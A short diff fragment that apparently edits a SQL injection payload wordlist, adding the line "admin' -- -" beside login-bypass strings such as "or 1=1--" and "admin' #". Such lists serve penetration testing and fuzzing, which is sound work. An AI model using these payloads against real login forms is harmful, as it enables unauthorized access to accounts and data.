@@ -292,6 +292,7 @@ or 1=1--
 or 1=1#
 or 1=1/*
 admin' --
+admin' -- -
 admin' #
 admin'/*
 admin' or '2' LIKE '1
